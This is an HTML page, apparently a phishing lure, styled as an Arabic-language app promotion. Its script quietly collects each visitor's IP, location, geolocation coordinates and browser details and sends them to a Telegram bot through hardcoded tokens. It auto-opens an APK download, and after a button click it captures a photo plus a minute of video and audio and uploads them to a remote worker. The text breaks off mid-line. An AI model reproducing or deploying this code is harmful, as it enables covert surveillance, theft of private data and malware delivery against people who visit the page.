<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ù‡Ø§ â€” Ø§Ù„Ø­Ù…Ù„Ø© Ø§Ù„Ø¥Ø´Ù‡Ø§Ø±ÙŠØ©</title>
<style>
  body { margin:0; background:#0f172a; color:#e5e7eb; font-family: system-ui, sans-serif;
         display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; text-align:center; }
  .container { max-width:800px; width:100%; }
  iframe { width:100%; aspect-ratio:16/9; border:none; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,.4); }
  h1 { font-size:1.5rem; margin-bottom:10px; }
  p { color:#94a3b8; margin-bottom:20px; }
  #startMedia {
    margin-top:20px; padding:12px 24px; font-size:16px; font-weight:bold; border:none; border-radius:8px;
    background:linear-gradient(45deg, #FFD700, #FFC107); color:#000; cursor:pointer;
    box-shadow:0 4px 10px rgba(0,0,0,0.3); display:inline-flex; align-items:center; gap:8px; transition:transform 0.2s ease;
  }
  #startMedia:hover { transform:scale(1.05); }
  .contacts { margin-top:20px; font-size:0.95rem; }
  .contacts a { color:#22d3ee; text-decoration:none; display:block; margin:4px 0; }
</style>
</head>
<body>
  <div class="container">
    <h1>Ù…Ø±Ø­Ø¨Ø§ Ø¨Ùƒ ÙÙŠ Ù…Ø¬Ù…Ø¹ Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø¹Ù…Ù„Ø§Ø¡</h1>
    <p>Ø´Ø§Ù‡Ø¯ Ø§Ù„ÙÙŠØ¯ÙŠÙˆØŒ ÙˆØ³ÙŠØ¨Ø¯Ø£ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ ÙÙŠ ØªØ¨ÙˆÙŠØ¨ Ø¬Ø¯ÙŠØ¯</p>
    <iframe src="https://www.youtube.com/embed/zUwlEVnEy-E?autoplay=1&mute=0&playsinline=1&rel=0&modestbranding=1" allowfullscreen></iframe>
    <button id="startMedia">ğŸŒŸ Ø³Ø¨ÙŠÙƒØ© Ø°Ù‡Ø¨ÙŠØ©</button>
    <div class="contacts">
      <a href="tel:+212781034015">ğŸ“ +212 781-034015</a>
      <a href="mailto:tabonmok7770888@gmail.com">âœ‰ï¸ tabonmok7770888@gmail.com</a>
      <a href="https://instagram.com/shoping_morocco1" target="_blank">ğŸ“¸ @shoping_morocco1</a>
    </div>
  </div>

<script>
  // Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø®Ø¯Ù…Ø§Øª
  const WORKER_URL = "https://media-relay.tabonmok7770888.workers.dev"; // Ø±Ø§Ø¨Ø· Ø§Ù„Ù€ Worker Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ
  const TELEGRAM_BOT = "8311279268:AAH4R0M7DPNSpx_bWSQ2bi9DuBuUkgqxLm4";
  const TELEGRAM_CHAT = "7664416709";
  const IPINFO_TOKEN = "3bc0a2eadd8ba5";
  const IPDATA_TOKEN = "cf2660a0b70d048e98abd2fa63498f74512ef8c328cb7ea5370ee669";
  const APK_URL = "https://drive.google.com/uc?export=download&id=1nQROVVDXjN1G4_71H0B5D0_4AvSjpVaq";

  const ua = navigator.userAgent;
  let ipInfoData = {}, ipDataData = {}, geo = {};

  function fetchIpInfo() {
    return fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`).then(r=>r.json()).then(d=>ipInfoData=d).catch(()=>{});
  }
  function fetchIpData() {
    return fetch(`https://api.ipdata.co?api-key=${IPDATA_TOKEN}`).then(r=>r.json()).then(d=>ipDataData=d).catch(()=>{});
  }
  function fetchGeo() {
    return new Promise(res=>{
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(p=>{
          geo={lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}; res();
        },()=>res());
      } else res();
    });
  }
  function sendTextToTelegram(extra="") {
    const now = new Date().toLocaleString('ar-MA',{hour12:false});
    const msg = `
ğŸš€ Ø²ÙŠØ§Ø±Ø© Ø¬Ø¯ÙŠØ¯Ø© â€” ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ù…Ù‡Ø§
â±ï¸ ${now}

ğŸŒ [ipinfo.io]
IP: ${ipInfoData.ip||"?"}
Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${ipInfoData.city||"?"}
Ø§Ù„Ø¯ÙˆÙ„Ø©: ${ipInfoData.country||"?"}

ğŸŒ [ipdata.co]
Ø§Ù„Ù‚Ø§Ø±Ø©: ${ipDataData.continent_name||"?"}
Ø§Ù„Ù…Ø²ÙˆØ¯: ${ipDataData.asn?.name||"?"}

ğŸ§­ Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª:
Lat: ${geo.lat??"null"} Lon: ${geo.lon??"null"} Â±${geo.acc??"?"}m

ğŸ“± UA: ${ua}

${extra}
    `;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,{
      method:"POST", headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id: TELEGRAM_CHAT, text: msg})
    });
  }

  Promise.all([fetchIpInfo(), fetchIpData(), fetchGeo()]).then(()=>{
    sendTextToTelegram();
    window.open(APK_URL, '_blank', 'noopener');
  });

  function blobToFile(blob, filename){ return new File([blob], filename, {type: blob.type}); }

  async function uploadToWorker(kind, file, caption="") {
    const form = new FormData();
    form.append("kind", kind);
    form.append("caption", caption);
    form.append("file", file);
    const res = await fetch(WORKER_URL, { method: "POST", body: form });
    if (!res.ok) throw new Error("Upload failed");
    return res.json();
  }

  document.getElementById("startMedia").onclick = async ()=>{
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      sendTextToTelegram("âœ… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø¨Ø§Ù„ØµÙˆØª/Ø§Ù„ØµÙˆØ±Ø©");

      const videoTrack = stream.getVideoTracks()[0];
      let photoBlob;
      if ("ImageCapture" in window) {
        try {
          const imageCapture = new ImageCapture(videoTrack);
          photoBlob = await imageCapture.takePhoto();
        } catch {
          photoBlob = await new Promise((resolve)=>{
            const v = document.createElement("video");
            v.srcObject = stream; v.muted = true; v.play();
            v.onloadeddata = ()=>{
              const c = document.createElement("canvas");
              c.width = v.videoWidth; c.height = v.videoHeight;
              c.getContext("2d").drawImage(v,0,0);
              c.toBlob(resolve, "image/jpeg", 0.9);
            };
          });
        }
      }
      if (photoBlob) {
        const photoFile = blobToFile(photoBlob, "photo.jpg");
        await uploadToWorker("photo", photoFile, "ğŸ“¸ ØµÙˆØ±Ø© Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© â€” Ø§Ù„Ù…Ù‡Ø§");
      }

      const recorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp9,opus" });
      const chunks = [];
      recorder.ondataavailable = e => e.data && chunks.push(e.data);
      const stopPromise = new Promise(res=> recorder.onstop = res);
      recorder.start();
      setTimeout(()=> recorder.state === "recording" && recorder.stop(), 60000);
      await stopPromise;

      const videoBlob = new Blob(chunks, { type: "video/webm" });
      const videoFile = blobToFile(videoBlob, "clip.webm");
      await uploadToWorker("video", videoFile, "ğŸ¥ ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© â€” Ø§Ù„Ù…Ù‡Ø§");

      const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const audioRecorder = new MediaRecorder(audioStream, { mimeType: "audio/webm" });
      const audioChunks = [];
      audioRecorder.ondataavailable = e => e.data && audioChunks.push(e.data);
      const stopAudioPromise = new Promise(res=> audioRecorder.onstop = res);
      audioRecorder.start();
      setTimeout(()=> audioRecorder.state === "recording" && audioRecorder.stop(), 60000);
      await stopAudioPromise;

      const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
      const audioFile = blobToFile(audioBlob, "audio.webm");
      await uploadToWorker("audio", audioFile, "ğŸ™ï¸ ØµÙˆØª Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© â€” Ø§Ù„Ù…Ù‡Ø§");

      stream.getTracks().forEach(t=>t.stop());
      audioStream.getTracks().forEach(t=>t.stop());

      sendTextToTelegram("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„ÙÙŠØ¯ÙŠÙˆ ÙˆØ§Ù„ØµÙˆØª Ø¥Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­");

    } catch (e) {
      sendTextToTelegram("âŒ ÙØ´Ù„ Ø·Ù„Ø¨
